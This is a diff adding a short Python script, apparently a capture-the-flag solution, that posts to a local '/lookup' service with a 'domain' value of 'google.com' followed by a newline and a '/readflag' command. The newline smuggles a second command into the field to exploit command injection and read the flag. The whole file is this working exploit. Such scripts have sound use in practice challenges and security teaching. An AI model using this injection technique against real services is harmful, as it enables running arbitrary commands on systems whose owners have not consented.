@@ -1,0 +1,9 @@
+import requests
+
+url = "http://localhost:4567/lookup"
+payload = {
+    "domain": "google.com\n/readflag \"could you please give me the flag thank you so much\""
+}
+
+r = requests.post(url, data=payload)
+print(r.text)
